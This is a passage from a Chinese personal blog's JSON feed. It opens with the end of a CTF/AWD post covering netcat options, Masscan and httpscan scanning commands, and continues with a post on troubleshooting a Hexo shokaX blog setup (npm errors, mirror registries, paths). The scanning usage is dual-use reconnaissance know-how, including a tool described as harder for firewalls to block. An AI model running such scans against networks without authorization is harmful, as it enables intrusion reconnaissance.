<span class=\"token parameter variable\">-q</span> secs                 在 stdin 上的 EOF 和延迟秒后退出</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token parameter variable\">-s</span> addr                 本地源地址</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token parameter variable\">-T</span> tos                  设置服务类型</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token parameter variable\">-t</span>                      应答TELNET协商</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token parameter variable\">-u</span>                      UDP模式</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token parameter variable\">-v</span>                      verbose <span class=\"token punctuation\">[</span>使用两次以更加详细<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token parameter variable\">-w</span> secs                 连接和最终网络读取的超时时间</pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        <span class=\"token parameter variable\">-C</span>                      发送 CRLF 作为行结束符</pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        <span class=\"token parameter variable\">-z</span>                      零 I/O 模式 <span class=\"token punctuation\">[</span>用于扫描<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>port numbers can be individual or ranges: lo-hi <span class=\"token punctuation\">[</span>inclusive<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>hyphens <span class=\"token keyword\">in</span> port names must be backslash escaped <span class=\"token punctuation\">(</span>e.g. <span class=\"token string\">'ftp\\-data'</span><span class=\"token punctuation\">)</span>.</pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token comment\"># 端口号可以是单个端口号，也可以是范围：lo-hi [包含]；</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token comment\"># 端口名称中的连字符必须使用反斜杠转义（例如 “ftp\\-data”）。</span></pre></td></tr></table></figure><h2 id=\"后话\"><a class=\"anchor\" href=\"#后话\">#</a> 后话</h2>\n<p>nc、netcat、nmap……kali 还有多少不可估量的工具等着自己发掘</p>\n<h3 id=\"题外话1masscan\"><a class=\"anchor\" href=\"#题外话1masscan\">#</a> 题外话 1：<a href=\"http://t.csdnimg.cn/2uU8h\">Masscan</a></h3>\n<blockquote>\n<p>Masscan 是一款快速、高性能的开源端口扫描工具，旨在以极高的速度扫描整个互联网的 IPv4 地址空间。它的设计目标是快速、灵活且适用于大规模的端口扫描任务。</p>\n</blockquote>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>masscan <span class=\"token punctuation\">\\</span><span class=\"token operator\">&lt;</span>IP或网段<span class=\"token operator\">></span> <span class=\"token parameter variable\">-p</span> <span class=\"token punctuation\">\\</span><span class=\"token operator\">&lt;</span>端口号或端口范围<span class=\"token operator\">></span> <span class=\"token parameter variable\">--rate</span> <span class=\"token punctuation\">\\</span><span class=\"token operator\">&lt;</span>每秒发送数据包数量<span class=\"token operator\">></span>（一般十万或一百万）</pre></td></tr></table></figure><p>其他参数详解：</p>\n<table>\n<thead>\n<tr>\n<th>选项</th>\n<th>作用</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>--excludefile filename</td>\n<td>排除文件中的选项</td>\n</tr>\n<tr>\n<td>-oX filename</td>\n<td>输出到 filename 的 XML</td>\n</tr>\n<tr>\n<td>-oG filename</td>\n<td>输出到 filename 在的 grepable 格式</td>\n</tr>\n<tr>\n<td>-oJ filename</td>\n<td>输出到 filename 在 JSON 格式。</td>\n</tr>\n</tbody>\n</table>\n<p>主打一个快捷迅速<br />\n<strong>参考文章：</strong><br />\n<a href=\"http://t.csdnimg.cn/2uU8h\">http://t.csdnimg.cn/2uU8h</a></p>\n<h3 id=\"题外话2httpscan\"><a class=\"anchor\" href=\"#题外话2httpscan\">#</a> 题外话 2：<a href=\"https://github.com/zer0h/httpscan\">httpscan</a></h3>\n<p><a href=\"https://github.com/zer0h/httpscan\">项目地址</a></p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>httpscan.py <span class=\"token number\">192.168</span>.0.0/24 –t <span class=\"token number\">10</span></pre></td></tr></table></figure><blockquote>\n<p>httpscan 是一个扫描指定 CIDR 网段的 Web 主机的小工具。和端口扫描器不一样，httpscan 是以爬虫的方式进行 Web 主机发现，因此相对来说不容易被防火墙拦截。</p>\n</blockquote>\n<h2 id=\"参考链接\"><a class=\"anchor\" href=\"#参考链接\">#</a> 参考链接：</h2>\n<p><a href=\"http://t.csdnimg.cn/iN9Wc\">http://t.csdnimg.cn/iN9Wc</a></p>\n",
            "tags": [
                "AWD",
                "kali",
                "tools",
                "AWD",
                "CTF"
            ]
        },
        {
            "id": "https://ctf-learner.github.io/post/AWD%E5%88%9D%E4%BD%93%E9%AA%8C/",
            "url": "https://ctf-learner.github.io/post/AWD%E5%88%9D%E4%BD%93%E9%AA%8C/",
            "title": "AWD初体验",
            "date_published": "2024-04-14T04:40:23.000Z",
            "content_html": "<p>被打爆了，learning~~<br />\n 等待作者更新吧</p>\n",
            "tags": [
                "AWD",
                "Attack and Defence",
                "kali tools"
            ]
        },
        {
            "id": "https://ctf-learner.github.io/post/%E6%90%AD%E5%8D%9A%E5%AE%A2%E4%B8%80%E8%B7%AF%E7%9A%84%E5%BF%83%E9%85%B8/",
            "url": "https://ctf-learner.github.io/post/%E6%90%AD%E5%8D%9A%E5%AE%A2%E4%B8%80%E8%B7%AF%E7%9A%84%E5%BF%83%E9%85%B8/",
            "title": "搭博客一路的心酸",
            "date_published": "2024-04-10T03:50:46.000Z",
            "content_html": "<p>一开始一眼相中了 shoka 主题的样式，谁料到后来搬石头砸了自己的脚。<br />\n部署到一半发现 shoka 有了升级版 shokaX，只得重新来过<br />\n随后 <code>npm install</code>  反复报错，真是头大<br />\n在配置图片时候又发现用 images.yml 的相对路径加载不到。<br />\n换了图床后 images.yml 也没加载成功……😑😰</p>\n<p>第一个拦路虎就是<strong> hexo init</strong><br />\n 卡住了无数次…… 耐心不够用了，都怀疑是不是 git bash 坏掉了<br />\n最后换源再 <code>npm hexo init</code> <br />\n 长舒一口气</p>\n<p>在安装前已经修改了 nodejs 的权限问题</p>\n<h3 id=\"powershell的脚本运行问题\"><a class=\"anchor\" href=\"#powershell的脚本运行问题\">#</a> powershell 的脚本运行问题</h3>\n<p>若直接运行 hexo 会报这样的错误<br />\n<img loading=\"lazy\" data-src=\"/images/%E6%90%AD%E5%8D%9A%E5%AE%A2%E4%B8%80%E8%B7%AF%E7%9A%84%E5%BF%83%E9%85%B8/24-04-10-2.png\" alt=\"err\" /></p>\n<p>设置 - 系统 - 开发者选项<br />\n &quot;允许本地 powershell 脚本在未签名的情况下允许&quot; 选择开启<br />\n<img loading=\"lazy\" data-src=\"/images/%E6%90%AD%E5%8D%9A%E5%AE%A2%E4%B8%80%E8%B7%AF%E7%9A%84%E5%BF%83%E9%85%B8/24-04-10-1.png\" alt=\"设置-系统-开发者选项\" /></p>\n<h3 id=\"躲不掉的还是npm-err\"><a class=\"anchor\" href=\"#躲不掉的还是npm-err\">#</a> 躲不掉的还是 npm ERR！</h3>\n<p><img loading=\"lazy\" data-src=\"/images/%E6%90%AD%E5%8D%9A%E5%AE%A2%E4%B8%80%E8%B7%AF%E7%9A%84%E5%BF%83%E9%85%B8/24-04-10-3.png\" alt=\"&quot;每次npm install时的噩梦&quot;\" title=\"npm ERR! Cannot read properties of null (reading 'matches')\" /><br />\n<strong>npm ERR! Cannot read properties of null (reading 'matches')</strong><br />\n 网上面对这个报错的做法是</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">npm</span> cache clean <span class=\"token parameter variable\">--force</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>或者二傻子GPT说</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">npm</span> <span class=\"token function\">install</span> <span class=\"token parameter variable\">-g</span> <span class=\"token function\">npm</span></pre></td></tr></table></figure><p>也有的说删除 <code>package-lock.json</code>  删除 <code>node-modules</code>  的，但是没有 lock……<br />\n 尝试了换源，似乎还是没什么卵用……<br />\n 最后用 cnpm 才成功下载……💔</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">npm</span> <span class=\"token function\">install</span> <span class=\"token parameter variable\">-g</span> cnpm</pre></td></tr></table></figure><p>命令丢这下次好拿 (cnpm 换源的命令相同)</p>\n<figure class=\"highlight url\"><figcaption data-lang=\"url\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token path\">npm</span> 官方镜像网址:   https://registry.npmjs.org/</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>淘宝 NPM 镜像：     https://registry.npm.taobao.org</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>阿里云 NPM 镜像：   https://npm.aliyun.com</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>腾讯云 NPM 镜像：   https://mirrors.cloud.tencent.com/npm/</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>华为云 NPM 镜像：   https://mirrors.huaweicloud.com/repository/npm/</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>网易 NPM 镜像：     https://mirrors.163.com/npm/</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>中国科学技术大学开源镜像站：http://mirrors.ustc.edu.cn/</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>清华大学开源镜像站：https://mirrors.tuna.tsinghua.edu.cn/</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>腾讯，华为，阿里的镜像站基本上比较全</pre></td></tr></table></figure><figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">npm</span> config <span class=\"token builtin class-name\">set</span> registry <span class=\"token punctuation\">[</span>url<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\"># 设置镜像仓库</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">npm</span> config get registry</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\"># 查看当前镜像仓库</span></pre></td></tr></table></figure><h3 id=\"相对路径问题\"><a class=\"anchor\" href=\"#相对路径问题\">#</a> 相对路径问题</h3>\n<p>看各路 hexo 教程在说相对路径时候都一脸蒙<br />\n学 Linux 时候相对路径是./ 开头，或者绝对路径根目录 / 开头<br />\n但是教程上谈到发布文章的相对路径都是 / 开头</p>\n<blockquote>\n<p>先看看官网的解释<br />\n相对地址<br />\n默认情况下，Hexo 生成的超链接都是绝对地址。例如，如果您的网站域名为 <a href=\"http://example.com\">example.com</a>，您有一篇文章名为 hello，那么绝对链接可能像这样：&lt;<a href=\"http://example.com/hello.html%5C\">http://example.com/hello.html\\</a>&gt; ，它是绝对于域名的。相对链接像这样：/hello.html，也就是说，无论用什么域名访问该站点，都没有关系，这在进行反向代理时可能用到。通常情况下，建议使用绝对地址。</p>\n</blockquote>\n<p>这里相对路径其实指的网站的根目录<br />\n在 hexo g 之后生成的 public 目录会在 hexo d 部署到网站上<br />\n那么相对路径指的就是以 public 目录为起始 /<br />\n<img loading=\"lazy\" data-src=\"/images/%E6%90%AD%E5%8D%9A%E5%AE%A2%E4%B8%80%E8%B7%AF%E7%9A%84%E5%BF%83%E9%85%B8/24-04-10-4.png\" alt=\"public文件夹\" /><br />\n如果还是定位不到图片的地址，就把图片和文章放一起 hexo g 之后看 /public 下的位置<br />\n然后就知道图片的地址该怎么写了</p>\n<h3 id=\"imagesyml图片加载不到问题\"><a class=\"anchor\" href=\"#imagesyml图片加载不到问题\">#</a> images.yml 图片加载不到问题</h3>\n<blockquote>\n<p>官方配置文档：<a href=\"https://docs.kaitaku.xyz/guide/theme.html#%E8%87%AA%E5%AE%9A%E4%B9%89%E7%BD%91%E7%AB%99%E8%BD%AE%E6%92%AD%E5%9B%BE\">https://docs.kaitaku.xyz/guide/theme.html# 自定义网站轮播图</a></p>\n</blockquote>\n<p>但是本地测试的时候发现，images.yml 中使用相对路径图片没有加载，于是按照文档说明，分别在</p>\n<ul class=\"lvl-0\">\n<li class=\"lvl-2\">\n<p>主题文件夹下_images_index.yml</p>\n</li>\n<li class=\"lvl-2\">\n<p>source/_data/images_index.yml</p>\n</li>\n</ul>\n<p>这些位置都<strong>没有成功</strong>加载网站背景图片。<br />\n<strong><mark>解决方案</mark></strong><br />\n直接修改 <code>主题文件夹下_images_index.yml</code> ，即 <code>/theme/shohaX/images.yml</code> 。按照官方文档 SXC 的下载方式，主题文件夹在 <code>/node_modules/hexo-theme-shokaX/images.yml</code></p>\n<ul class=\"lvl-0\">\n<li class=\"lvl-2\">\n<p>source/_data/images.yml</p>\n</li>\n</ul>\n<blockquote>\n<p>心里话：真是给我累吐血了</p>\n</blockquote>\n<h4 id=\"nrm管理\"><a class=\"anchor\" href=\"#nrm管理\">#</a> nrm 管理</h4>\n<p>nrm 是一个 npm 源管理器，允许你快速地在 npm 源间切换</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">npm</span> <span class=\"token function\">install</span> <span class=\"token parameter variable\">-g</span> nrm</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\"># 安装 nrm 源管理工具</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>nrm <span class=\"token function\">ls</span>    </pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\"># 查看可选的源</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>nrm use <span class=\"token punctuation\">[</span>options<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\"># 切换源</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>nrm <span class=\"token builtin class-name\">test</span>     </pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># 测试速度</span></pre></td></tr></table></figure><h4 id=\"nvm-node多版本管理\"><a class=\"anchor\" href=\"#nvm-node多版本管理\">#</a> nvm node 多版本管理</h4>\n<p>安装和使用参考<a href=\"http://t.csdnimg.cn/B42dl\">这里</a></p>\n<blockquote>\n<p>参考链接<br />\n<a href=\"http://t.csdnimg.cn/WNDXm\"> http://t.csdnimg.cn/WNDXm</a></p>\n</blockquote>\n",
            "tags": [
                "关于shokaX",
                "daily",
                "nodejs"
            ]
        }
    ]
}